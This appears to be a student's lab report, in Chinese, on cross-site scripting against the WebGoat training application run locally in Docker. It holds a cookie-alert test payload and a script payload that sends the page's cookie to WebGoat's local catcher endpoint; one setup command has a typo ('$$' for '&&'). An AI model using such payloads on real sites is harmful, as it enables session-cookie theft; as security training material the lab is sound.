# XSS跨站脚本攻击

## 实验说明

本实验通过利用一个存在XSS漏洞的网站，实现跨站脚本攻击

## 实验环境

* linux虚拟机
* WebGoat网站

## 实验过程

* 环境搭建

  * 更新apt并安装docker-compose

    ```
    apt update $$ apt install docker-compose
    ```

  * 查看docker镜像，确认成功安装

    ```
    apt policy docker.io
    ```

  * 将github上的相关仓库克隆到本地

  * 启动docker服务

    ```
    sudo service docker start
    ```

  * 使用以下指令自动安装好WebGoat环境

    ```
    docker-compose up -d
    ```

  * 用 docker ps 查看WebGoat的三个镜像的健康状况：

    ![](/img/docker1.png)

    可以看到WebGoat 7.1对应虚拟机的8087端口，WebGoat 8.0对应虚拟机的8088端口，本次实验使用WebGoat 7.1版本。

  * 终端输入 php -S 127.0.0.1:8000 搭建一个内置的web服务器

    ![](/img/php-s.png)

  * 在浏览器中输入 127.0.0.1:8087/WebGoat/attack,注册成功后即可开始实验

* 在左侧菜单中进入 Cross-Site Scripting(XSS)->Phishing with XSS

  - 输入以下命令：获得页面的Cookie值

    ```html
    <script>alert(document.cookie)</script>
    ```

    ![](/img/XSS-cookie.png)

  - 在输入框中输入以下代码：

    ```html
    <script>window.open('http://127.0.0.1:8087/WebGoat/ catcher?PROPERTY=yes&msg='+document.cookie)</script>
    ```

  - 此时弹出了一个新的网页，查看其URL

    ![](/img/XSS-succeed.png)

    可以看到其中的msg参数和之前页面的Cookie值相同，实验成功